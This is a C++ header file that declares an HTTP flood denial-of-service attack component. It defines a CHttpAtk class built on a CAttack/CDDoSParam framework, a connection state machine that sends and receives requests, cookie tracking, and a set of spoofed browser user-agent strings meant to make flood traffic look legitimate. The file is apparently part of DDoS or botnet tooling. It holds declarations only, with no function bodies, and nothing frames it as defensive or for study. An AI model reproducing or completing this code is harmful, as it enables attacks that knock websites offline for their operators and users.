#ifndef _HTTP_ATK_H
#define _HTTP_ATK_H

#include "pktbuild.h"

#define HTTP_WAIT_MAX  10 /*SECOND*/


#define HTTP_BUF_SIZE         10240
#define HTTP_PATH_MAX           256
#define HTTP_DOMAIN_MAX         128
#define HTTP_COOKIE_MAX         8   // no more then 8 tracked cookies
#define HTTP_COOKIE_LEN_MAX     128 // max cookie len


/* User agent strings */
#define TABLE_HTTP_ONE     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
#define TABLE_HTTP_TWO     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
#define TABLE_HTTP_THREE   "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
#define TABLE_HTTP_FOUR    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
#define TABLE_HTTP_FIVE    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"


typedef enum{
	HTTP_CONN_INIT = 0, // Inital state	
	HTTP_CONN_CONNECTING, // Waiting for it to connect
	HTTP_CONN_SEND_HEADER, // Sending HTTP request hdr
	HTTP_CONN_SEND_BODY,
	HTTP_CONN_RECV_HEADER,
	HTTP_CONN_RECV_BODY,
	HTTP_CONN_RESTART, // Scheduled to restart connection next spin
	HTTP_CONN_CLOSED, //some unrecoverable error happened, or active to stop job
	HTTP_CONN_PAUSED,
	HTTP_CONN_MAX
}HTTP_CONN_ST_E;

typedef enum{
	HTTP_EVT_RD = 0,
	HTTP_EVT_WR,
	HTTP_EVT_CLOSE, /*peer closed*/
	HTTP_EVT_TIMEOUT, /*some error happened*/
	HTTP_EVT_MAX
}HTTP_CONN_EVT_E;

class CHttpAtk;
class CHttpConnState{
public:
	CHttpConnState(uint32_t dstaddr, uint16_t dstport, char *user_agent,
		char *domain, char *path, char *method, uint32_t payload_len, CHttpAtk* owner);
	virtual ~CHttpConnState();

	void enter_state(HTTP_CONN_ST_E state);
	void st_handle(HTTP_CONN_EVT_E event, void* param1, void* param2);

	int get_sendfd() {return m_sendfd;}
	bool is_paused() {return m_cur_state == HTTP_CONN_PAUSED;}

private:
	void st_init_handle(HTTP_CONN_EVT_E event, void* param1, void* param2);
	void st_connecting_handle(HTTP_CONN_EVT_E event, void* param1, void* param2);
	void st_sendhdr_handle(HTTP_CONN_EVT_E event, void* param1, void* param2);
	void st_sendbody_handle(HTTP_CONN_EVT_E event, void* param1, void* param2);
	void st_recvhdr_handle(HTTP_CONN_EVT_E event, void* param1, void* param2);
	void st_recvbody_handle(HTTP_CONN_EVT_E event, void* param1, void* param2);
	void st_restart_handle(HTTP_CONN_EVT_E event, void* param1, void* param2);
	void st_close_handle(HTTP_CONN_EVT_E event, void* param1, void* param2);

	void prepare_header();
	void prepare_body();
	int32_t parse_header();

private:
	static void on_write(int32_t fd, void* param1);
	static void on_recv(int fd, void *param1, char *recvBuf, int recvLen);
    static void on_free(int fd, void* param1);

public:
	int m_sendfd;
	CHttpAtk *m_owner;

	uint64_t m_last_recv;
    uint64_t m_last_send;
    bool m_is_wr_waited;
    bool m_is_rd_waited;

private:
	uint32_t m_is_sock_failed; /*whether if need close local socket, used when normal flood attack*/

    uint32_t m_hdl_pos;
    uint32_t m_buf_len;
    char m_buffer[HTTP_BUF_SIZE];

    HTTP_CONN_ST_E m_cur_state;

private:
	bool m_keepalive;
	uint32_t m_response_content_length;
    int m_num_cookies;
    char m_cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX];

    //bool m_chunked;
    //int32_t m_protect_type;
private:
	uint32_t m_dst_addr;
    uint16_t m_dst_port;
    char m_user_agent[512];
    char m_path[HTTP_PATH_MAX + 1];
    char m_domain[HTTP_DOMAIN_MAX + 1];
    char m_method[9]; 
    
    bool m_is_redirect;
    uint32_t m_payload_len;
};


class CHttpAtk : public CAttack {
public:
	CHttpAtk():CAttack(){
		strncpy(m_name, "httpflood", 31);
		m_conn_cnt = 0;
		memset(m_conn_table, 0, sizeof(m_conn_table));

        MUTEX_SETUP(m_conn_lock);
	}
	CHttpAtk(const CDDoSParam& param) :CAttack(param){
		strncpy(m_name, "httpflood", 31);
		m_conn_cnt = 0;
		memset(m_conn_table, 0, sizeof(m_conn_table));

		m_params.m_iph_proto = IPPROTO_TCP;
        MUTEX_SETUP(m_conn_lock);

	}

	virtual ~CHttpAtk(){
        MUTEX_CLEANUP(m_conn_lock);
    };

	bool check_params();

    int start();
	void stop();
    bool is_stopped();

	int32_t attack_one_pkt(int thrd_index);

	void del_conn_obj(CHttpConnState *conn_obj);
    void add_conn_obj(CHttpConnState *conn_obj);

public:
	void expire_handle();

private:
	uint32_t m_conn_cnt;
    MUTEX_TYPE m_conn_lock;
	CHttpConnState *m_conn_table[MAX_CONCUR_CNT];
};

#endif
